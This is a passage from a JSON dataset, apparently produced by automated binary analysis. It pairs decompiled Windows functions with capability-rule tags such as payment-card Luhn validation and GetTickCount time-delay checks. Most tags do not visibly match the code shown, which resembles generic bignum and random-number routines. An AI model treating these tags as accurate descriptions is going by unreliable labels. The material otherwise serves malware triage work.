            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004015a0(uint *arg_8h)\n\n{\n    fcn.00407ec0(arg_8h + 1);\n    arg_8h[0x1c] = 0;\n    fcn.00408120(arg_8h + 0x1d, 400);\n    *arg_8h = 0;\n    return;\n}\n",
        "token_count": 85
    },
    "004015e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004015e0(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    bool bVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint32_t *puVar6;\n    uint var_20h;\n    uint var_10h;\n    \n    iVar4 = 0;\n    if (0x20 < arg_10h) {\n        return -0x3c;\n    }\n    do {\n        if (0x100 < iVar4) {\n            iVar3 = -0x3c;\n            goto code_r0x004016ea;\n        }\n        iVar3 = fcn.00401430(arg_8h);\n        if (iVar3 != 0) goto code_r0x004016ea;\n        iVar3 = *(arg_8h + 0x70);\n        if (iVar3 < 1) break;\n        puVar6 = arg_8h + 0x7c;\n        bVar2 = true;\n        do {\n            bVar1 = false;\n            if (puVar6[1] <= *puVar6) {\n                bVar1 = bVar2;\n            }\n            iVar3 = iVar3 + -1;\n            puVar6 = puVar6 + 5;\n            bVar2 = bVar1;\n        } while (iVar3 != 0);\n        iVar4 = iVar4 + 1;\n    } while (!bVar1);\n    iVar4 = arg_8h + 4;\n    _var_20h = ZEXT816(0);\n    _var_10h = ZEXT816(0);\n    iVar3 = fcn.00407d00(iVar4, &var_20h);\n    if (iVar3 == 0) {\n        fcn.00407ec0(iVar4);\n        fcn.00407ee0(iVar4);\n        iVar3 = fcn.00407f70(iVar4, 0);\n        if (((iVar3 == 0) && (iVar3 = fcn.00408040(iVar4, &var_20h, 0x20),  iVar3 == 0)) &&\n           (iVar3 = fcn.00407f00(&var_20h, 0x20, &var_20h, 0),  iVar3 == 0)) {\n            if (0 < *(arg_8h + 0x70)) {\n                puVar5 = arg_8h + 0x7c;\n                do {\n                    *puVar5 = 0;\n                    puVar5 = puVar5 + 5;\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 < *(arg_8h + 0x70));\n            }\n            fcn.0040cbe0(arg_ch, &var_20h, arg_10h);\n            iVar3 = 0;\n        }\n    }\ncode_r0x004016ea:\n    fcn.00408120(&var_20h, 0x20);\n    return iVar3;\n}\n",
        "token_count": 692
    },
    "00401710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401710(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    arg_8h[0x1c] = 0;\n    fcn.0040cc00(arg_8h + 0x1d, 0, 400);\n    *arg_8h = 0;\n    fcn.00407ee0(arg_8h + 1);\n    iVar1 = arg_8h[0x1c];\n    if (iVar1 < 0x14) {\n        arg_8h[iVar1 * 5 + 0x1d] = fcn.004080f0;\n        arg_8h[iVar1 * 5 + 0x1e] = 0;\n        arg_8h[iVar1 * 5 + 0x20] = 0x20;\n        arg_8h[iVar1 * 5 + 0x21] = 1;\n        arg_8h[0x1c] = arg_8h[0x1c] + 1;\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "00401970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401970(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t *puVar9;\n    int32_t iVar10;\n    uint *arg_8h_00;\n    uint var_38h;\n    uint32_t auStack56 [7];\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint *var_8h;\n    uint *var_4h;\n    \n    arg_8h_00 = &var_38h;\n    var_4h = arg_8h_00;\n    fcn.0040cc00(arg_8h_00, 0, 0x30);\n    iVar10 = 0;\n    var_8h = arg_8h + 8;\n    pcVar7 = arg_8h + 0xf;\ncode_r0x004019a3:\n    do {\n        *pcVar7 = *pcVar7 + '\\x01';\n        if (*pcVar7 == '\\0') {\n            pcVar7 = pcVar7 + -1;\n            if (0 < pcVar7 + (1 - arg_8h)) goto code_r0x004019a3;\n        }\n        iVar8 = fcn.00406320(arg_8h + 8, 1, arg_8h, arg_8h_00);\n        if (iVar8 != 0) goto code_r0x00401a27;\n        iVar10 = iVar10 + 0x10;\n        arg_8h_00 = var_4h + 4;\n        var_4h = arg_8h_00;\n        pcVar7 = arg_8h + 0xf;\n        if (0x2f < iVar10) {\n            iVar10 = 0;\n            do {\n                puVar9 = &var_38h + iVar10;\n                iVar8 = iVar10 + 0x10;\n                uVar2 = *(auStack56 + iVar10 + 4);\n                uVar3 = *(auStack56 + iVar10 + 8);\n                puVar1 = (arg_ch - &var_38h) + puVar9;\n                uVar4 = puVar1[1];\n                uVar5 = puVar1[2];\n                uVar6 = puVar1[3];\n                *puVar9 = *puVar1 ^ *puVar9;\n                *(auStack56 + iVar10) = uVar4 ^ *(auStack56 + iVar10);\n                *(auStack56 + iVar10 + 4) = uVar5 ^ uVar2;\n                *(auStack56 + iVar10 + 8) = uVar6 ^ uVar3;\n                iVar10 = iVar8;\n            } while (iVar8 < 0x30);\n            iVar8 = fcn.00406390(var_8h, &var_38h, 0x100);\n            if (iVar8 == 0) {\n                *arg_8h = var_18h;\n                arg_8h[1] = uStack24;\n                arg_8h[2] = uStack20;\n                arg_8h[3] = uStack16;\n            }\ncode_r0x00401a27:\n            fcn.00408120(&var_38h, 0x30);\n            return iVar8;\n        }\n    } while( true );\n}\n",
        "token_count": 807
    },
    "00401a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401a40(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.00406350(arg_8h + 0x20);\n        fcn.00408120(arg_8h, 0x140);\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "00401a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401a70(uint arg_8h)\n\n{\n    fcn.0040cc00(arg_8h, 0, 0x140);\n    return;\n}\n",
        "token_count": 43
    },
    "00401b80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_180h\n\nint32_t __cdecl fcn.00401b80(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint var_180h;\n    uint in_stack_fffffe80;\n    uint in_stack_fffffe84;\n    uint in_stack_fffffe88;\n    uint in_stack_fffffe8c;\n    uint in_stack_fffffe90;\n    uint in_stack_fffffe94;\n    uint in_stack_fffffe98;\n    uint in_stack_fffffe9c;\n    uint in_stack_fffffea0;\n    uint in_stack_fffffea4;\n    uint in_stack_fffffea8;\n    uint in_stack_fffffeac;\n    uint in_stack_fffffeb0;\n    uint in_stack_fffffeb4;\n    uint in_stack_fffffeb8;\n    uint in_stack_fffffebc;\n    uint in_stack_fffffec0;\n    uint in_stack_fffffec4;\n    uint in_stack_fffffec8;\n    uint in_stack_fffffecc;\n    uint in_stack_fffffed0;\n    uint in_stack_fffffed4;\n    uint in_stack_fffffed8;\n    uint in_stack_fffffedc;\n    \n    uVar1 = *(arg_8h + 0x18);\n    if ((uVar1 < 0x181) && (arg_10h <= 0x180 - uVar1)) {\n        fcn.0040cc00(&var_180h, 0, 0x180);\n        iVar2 = (**(arg_8h + 0x138))(*(arg_8h + 0x13c), &var_180h, uVar1);\n        if (iVar2 != 0) {\n            return -0x34;\n        }\n        iVar2 = *(arg_8h + 0x18);\n        if ((arg_ch != 0) && (arg_10h != 0)) {\n            fcn.0040cbe0(&var_180h + iVar2, arg_ch, arg_10h);\n            iVar2 = iVar2 + arg_10h;\n        }\n        iVar2 = fcn.00401780(&var_180h, &var_180h, iVar2, unaff_EDI, unaff_ESI, unaff_EBX, var_180h, in_stack_fffffe80, \n                             in_stack_fffffe84, in_stack_fffffe88, in_stack_fffffe8c, in_stack_fffffe90, \n                             in_stack_fffffe94, in_stack_fffffe98, in_stack_fffffe9c, in_stack_fffffea0, \n                             in_stack_fffffea4, in_stack_fffffea8, in_stack_fffffeac, in_stack_fffffeb0, \n                             in_stack_fffffeb4, in_stack_fffffeb8, in_stack_fffffebc, in_stack_fffffec0, \n                             in_stack_fffffec4, in_stack_fffffec8, in_stack_fffffecc, in_stack_fffffed0, \n                             in_stack_fffffed4, in_stack_fffffed8, in_stack_fffffedc);\n        if (iVar2 == 0) {\n            iVar2 = fcn.00401970(arg_8h, &var_180h);\n            if (iVar2 == 0) {\n                *(arg_8h + 0x10) = 1;\n            }\n        }\n        fcn.00408120(&var_180h, 0x180);\n        return iVar2;\n    }\n    return -0x38;\n}\n",
        "token_count": 834
    },
    "00401c70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00401c70(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    uint var_10h;\n    \n    _var_20h = ZEXT816(0);\n    _var_10h = ZEXT816(0);\n    fcn.00406370(arg_8h + 0x20);\n    *(arg_8h + 0x138) = arg_ch;\n    *(arg_8h + 0x13c) = arg_10h;\n    *(arg_8h + 0x18) = 0x20;\n    *(arg_8h + 0x1c) = 10000;\n    iVar1 = fcn.00406390(arg_8h + 0x20, &var_20h, 0x100);\n    if (iVar1 == 0) {\n        fcn.00401b80(arg_8h, arg_14h, arg_18h);\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "00401eb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401eb0(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    uVar1 = arg_10h >> 0x1f;\n    arg_10h = (arg_10h ^ uVar1) - uVar1;\n    var_8h = 1;\n    var_4h = &arg_10h;\n    var_ch = (uVar1 & 0xfffffffe) + 1;\n    fcn.00401ef0(arg_8h, arg_ch, &var_ch);\n    return;\n}\n",
        "token_count": 161
    },
    "00401ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ef0(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *arg_ch;\n    if (*arg_10h * iVar1 < 0) {\n        iVar2 = fcn.00401fc0(arg_ch, arg_10h);\n        if (iVar2 < 0) {\n            iVar2 = fcn.00404660(arg_8h, arg_10h, arg_ch);\n            if (iVar2 != 0) {\n                return;\n            }\n            *arg_8h = -iVar1;\n            return;\n        }\n        iVar2 = fcn.00404660(arg_8h, arg_ch, arg_10h);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    else {\n        iVar2 = fcn.00401ce0(arg_8h, arg_ch, arg_10h);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    *arg_8h = iVar1;\n    return;\n}\n",
        "token_count": 256
    },
    "00402060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402060(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    uVar1 = arg_ch >> 0x1f;\n    arg_ch = (arg_ch ^ uVar1) - uVar1;\n    var_8h = 1;\n    var_4h = &arg_ch;\n    var_ch = (uVar1 & 0xfffffffe) + 1;\n    fcn.004020a0(arg_8h, &var_ch);\n    return;\n}\n",
        "token_count": 143
    },
    "00402ff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402ff0(uint *arg_8h)\n\n{\n    if (arg_8h != NULL) {\n        if (arg_8h[2] != 0) {\n            fcn.00408120(arg_8h[2], arg_8h[1] << 2);\n            sub.msvcrt.dll_free(arg_8h[2]);\n        }\n        *arg_8h = 1;\n        arg_8h[1] = 0;\n        arg_8h[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "00403690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403690(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t arg_8h_00;\n    \n    if (10000 < arg_ch) {\n        return 0xfffffff0;\n    }\n    if (*(arg_8h + 4) < arg_ch) {\n        arg_8h_00 = sub.msvcrt.dll_calloc(arg_ch, 4);\n        if (arg_8h_00 == 0) {\n            return 0xfffffff0;\n        }\n        if (*(arg_8h + 8) != 0) {\n            fcn.0040cbe0(arg_8h_00, *(arg_8h + 8), *(arg_8h + 4) << 2);\n            fcn.00408120(*(arg_8h + 8), *(arg_8h + 4) << 2);\n            sub.msvcrt.dll_free(*(arg_8h + 8));\n        }\n        *(arg_8h + 4) = arg_ch;\n        *(arg_8h + 8) = arg_8h_00;\n    }\n    return 0;\n}\n",
        "token_count": 259
    },
    "00403f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403f50(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    var_8h = &var_4h;\n    var_4h = 0;\n    var_10h = 1;\n    var_ch = 1;\n    iVar1 = fcn.004020a0(arg_10h, &var_10h);\n    if (iVar1 < 0) {\n        return -10;\n    }\n    iVar1 = fcn.00402260(0, arg_8h, arg_ch, arg_10h);\n    if (iVar1 == 0) {\n        var_8h = &var_4h;\n        var_10h = 1;\n        var_ch = 1;\n        var_4h = iVar1;\n        iVar2 = fcn.004020a0(arg_8h, &var_10h);\n        while (iVar2 < 0) {\n            var_4h = *arg_8h;\n            if (*arg_10h * var_4h < 0) {\n                iVar1 = fcn.00401fc0(arg_8h, arg_10h);\n                if (-1 < iVar1) {\n                    iVar1 = fcn.00404660(arg_8h, arg_8h, arg_10h);\n                    goto code_r0x00404028;\n                }\n                iVar1 = fcn.00404660(arg_8h, arg_10h, arg_8h);\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n                var_4h = -var_4h;\n            }\n            else {\n                iVar1 = fcn.00401ce0(arg_8h, arg_8h, arg_10h);\ncode_r0x00404028:\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n            }\n            *arg_8h = var_4h;\n            var_8h = &var_4h;\n            var_4h = 0;\n            var_10h = 1;\n            var_ch = 1;\n            iVar2 = fcn.004020a0(arg_8h, &var_10h);\n        }\n        iVar2 = fcn.004020a0(arg_8h, arg_10h);\n        while (-1 < iVar2) {\n            var_4h = *arg_8h;\n            if (*arg_10h * var_4h < 1) {\n                iVar1 = fcn.00401ce0(arg_8h, arg_8h, arg_10h);\ncode_r0x004040bc:\n                iVar2 = var_4h;\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n            }\n            else {\n                iVar1 = fcn.00401fc0(arg_8h, arg_10h);\n                if (-1 < iVar1) {\n                    iVar1 = fcn.00404660(arg_8h, arg_8h, arg_10h);\n                    goto code_r0x004040bc;\n                }\n                iVar1 = fcn.00404660(arg_8h, arg_10h, arg_8h);\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n                iVar2 = -var_4h;\n            }\n            *arg_8h = iVar2;\n            iVar2 = fcn.004020a0(arg_8h, arg_10h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 828
    },
    "004040f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004040f0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_8h = &var_4h;\n    var_10h = 1;\n    var_4h = arg_10h;\n    var_ch = 1;\n    fcn.00404130(arg_8h, arg_ch, &var_10h);\n    return;\n}\n",
        "token_count": 120
    },
    "00404730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404730(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    uVar1 = arg_10h >> 0x1f;\n    arg_10h = (arg_10h ^ uVar1) - uVar1;\n    var_8h = 1;\n    var_4h = &arg_10h;\n    var_ch = (uVar1 & 0xfffffffe) + 1;\n    fcn.00404770(arg_8h, arg_ch, &var_ch);\n    return;\n}\n",
        "token_count": 159
    },
    "00404770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404770(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *arg_ch;\n    if (*arg_10h * iVar1 < 1) {\n        iVar2 = fcn.00401ce0(arg_8h, arg_ch, arg_10h);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    else {\n        iVar2 = fcn.00401fc0(arg_ch, arg_10h);\n        if (iVar2 < 0) {\n            iVar2 = fcn.00404660(arg_8h, arg_10h, arg_ch);\n            if (iVar2 != 0) {\n                return;\n            }\n            *arg_8h = -iVar1;\n            return;\n        }\n        iVar2 = fcn.00404660(arg_8h, arg_ch, arg_10h);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    *arg_8h = iVar1;\n    return;\n}\n",
        "token_count": 255
    },
    "00404e90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404e90(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t arg_8h_01;\n    int32_t *arg_10h_00;\n    int32_t *arg_ch_00;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if ((*(arg_18h + 4) < *(arg_10h + 4) + 1U) || (*(arg_18h + 8) == 0)) {\n        return 0xfffffffc;\n    }\n    fcn.0040cc00(*(arg_18h + 8), 0, *(arg_18h + 4) * 4);\n    arg_8h_00 = *(arg_10h + 4);\n    arg_ch_00 = *(arg_18h + 8);\n    arg_8h_01 = *(arg_ch + 4);\n    if (arg_8h_00 <= *(arg_ch + 4)) {\n        arg_8h_01 = arg_8h_00;\n    }\n    var_4h = 0;\n    arg_10h_00 = arg_ch_00;\n    if (arg_8h_00 != 0) {\n        do {\n            iVar3 = *(*(arg_8h + 8) + var_4h * 4);\n            iVar1 = **(arg_ch + 8);\n            iVar2 = *arg_10h_00;\n            fcn.00404ff0(arg_8h_01, *(arg_ch + 8), arg_10h_00, iVar3);\n            fcn.00404ff0(arg_8h_00, *(arg_10h + 8), arg_10h_00, (iVar1 * iVar3 + iVar2) * arg_14h);\n            var_4h = var_4h + 1;\n            *arg_10h_00 = iVar3;\n            arg_ch_00 = arg_10h_00 + 1;\n            arg_10h_00[arg_8h_00 + 2] = 0;\n            arg_10h_00 = arg_ch_00;\n        } while (var_4h < arg_8h_00);\n    }\n    fcn.0040cbe0(*(arg_8h + 8), arg_ch_00, arg_8h_00 * 4 + 4);\n    iVar3 = fcn.00401fc0(arg_8h, arg_10h);\n    if (iVar3 < 0) {\n        fcn.00405260(arg_8h_00, *(arg_8h + 8), *(arg_18h + 8));\n        return 0;\n    }\n    fcn.00405260(arg_8h_00, *(arg_10h + 8), *(arg_8h + 8));\n    return 0;\n}\n",
        "token_count": 706
    },
    "00404fb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404fb0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_8h = &var_4h;\n    var_4h = 1;\n    var_10h = 1;\n    var_ch = 1;\n    fcn.00404e90(arg_8h, &var_10h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 135
    },
    "00405260": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405260(int32_t arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    uVar3 = 0;\n    if (arg_8h != 0) {\n        arg_ch = arg_ch - arg_10h;\n        do {\n            uVar1 = *arg_10h;\n            uVar4 = uVar1 - uVar3;\n            *arg_10h = uVar4;\n            uVar2 = *(arg_ch + arg_10h);\n            *arg_10h = uVar4 - uVar2;\n            uVar3 = (uVar1 < uVar3) + (uVar4 < uVar2);\n            arg_10h = arg_10h + 1;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n        if (uVar3 != 0) {\n            do {\n                uVar1 = *arg_10h;\n                *arg_10h = uVar1 - uVar3;\n                bVar5 = uVar1 < uVar3;\n                uVar3 = uVar1 < uVar3;\n                arg_10h = arg_10h + 1;\n            } while (bVar5);\n        }\n    }\n    return;\n}\n",
        "token_count": 332
    },
    "004052d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004052d0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00405350(arg_8h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00406150(arg_8h, 1);\n        if (iVar1 == 0) {\n            iVar1 = fcn.004083a0(arg_8h + 8, arg_8h + 0x2c, arg_8h + 0x38, arg_8h + 0x20, arg_8h + 0x14, 0, 0);\n            if (iVar1 == 0) {\n                iVar1 = fcn.004081f0(arg_8h + 0x2c, arg_8h + 0x38, arg_8h + 0x20, arg_8h + 0x44, arg_8h + 0x50, \n                                     arg_8h + 0x5c);\n                if (iVar1 == 0) {\n                    return 0;\n                }\n            }\n        }\n    }\n    return 0xffffbe00;\n}\n",
        "token_count": 264
    },
    "004054f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004054f0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402060(arg_8h + 8, 0);\n    if (iVar1 == 0) {\n        return -0x4080;\n    }\n    iVar1 = fcn.00402060(arg_8h + 0x2c, 0);\n    if (iVar1 == 0) {\n        return -0x4080;\n    }\n    iVar1 = fcn.00402060(arg_8h + 0x38, 0);\n    if (iVar1 == 0) {\n        return -0x4080;\n    }\n    iVar1 = fcn.00402060(arg_8h + 0x20, 0);\n    if (iVar1 != 0) {\n        iVar1 = fcn.00402060(arg_8h + 0x14, 0);\n        if (iVar1 == 0) {\n            return -0x4080;\n        }\n        if ((((arg_ch == 0) || (iVar1 = fcn.00402180(arg_ch, arg_8h + 0x44),  iVar1 == 0)) &&\n            ((arg_10h == 0 || (iVar1 = fcn.00402180(arg_10h, arg_8h + 0x50),  iVar1 == 0)))) &&\n           ((arg_14h == 0 || (iVar1 = fcn.00402180(arg_14h, arg_8h + 0x5c),  iVar1 == 0)))) {\n            return 0;\n        }\n        return iVar1 + -0x4080;\n    }\n    return -0x4080;\n}\n",
        "token_count": 413
    },
    "004055c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004055c0(int32_t arg_8h)\n\n{\n    int32_t arg_ch;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    int32_t arg_8h_00;\n    \n    if (arg_8h != 0) {\n        fcn.00402ff0(arg_8h + 0x8c);\n        fcn.00402ff0(arg_8h + 0x98);\n        fcn.00402ff0(arg_8h + 0x68);\n        fcn.00402ff0(arg_8h + 0x20);\n        fcn.00402ff0(arg_8h + 0x38);\n        fcn.00402ff0(arg_8h + 0x2c);\n        fcn.00402ff0(arg_8h + 0x14);\n        fcn.00402ff0(arg_8h + 8);\n        fcn.00402ff0(arg_8h + 0x80);\n        fcn.00402ff0(arg_8h + 0x74);\n        fcn.00402ff0(arg_8h + 0x5c);\n        fcn.00402ff0(arg_8h + 0x50);\n        if (arg_8h + 0x44 != NULL) {\n            arg_8h_00 = *(arg_8h + 0x4c);\n            if (arg_8h_00 != 0) {\n                arg_ch = *(arg_8h + 0x48) << 2;\n                fcn.00408120(arg_8h_00, arg_ch);\n                sub.msvcrt.dll_free(*(arg_8h + 0x4c), arg_8h_00, arg_ch, unaff_ESI, unaff_EBP);\n            }\n            *(arg_8h + 0x44) = 1;\n            *(arg_8h + 0x48) = 0;\n            *(arg_8h + 0x4c) = 0;\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 469
    },
    "00405940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00405940(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (arg_ch != 0) {\n        iVar1 = fcn.00402180(arg_8h + 8, arg_ch);\n        if (iVar1 != 0) goto code_r0x004059c0;\n    }\n    if (arg_10h != 0) {\n        iVar1 = fcn.00402180(arg_8h + 0x2c, arg_10h);\n        if (iVar1 != 0) goto code_r0x004059c0;\n    }\n    if (arg_14h != 0) {\n        iVar1 = fcn.00402180(arg_8h + 0x38, arg_14h);\n        if (iVar1 != 0) goto code_r0x004059c0;\n    }\n    if (arg_18h != 0) {\n        iVar1 = fcn.00402180(arg_8h + 0x20, arg_18h);\n        if (iVar1 != 0) goto code_r0x004059c0;\n    }\n    if (arg_1ch != 0) {\n        iVar1 = fcn.00402180(arg_8h + 0x14, arg_1ch);\n        if (iVar1 != 0) {\ncode_r0x004059c0:\n            return iVar1 + -0x4080;\n        }\n    }\n    if (arg_ch != 0) {\n        uVar2 = fcn.00404640(arg_8h + 8);\n        *(arg_8h + 4) = uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 423
    },
    "004059f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004059f0(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040cc00(arg_8h, 0, 0xa4);\n    *(arg_8h + 0xa4) = arg_ch;\n    *(arg_8h + 0xa8) = arg_10h;\n    return;\n}\n",
        "token_count": 89
    },
    "00406040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
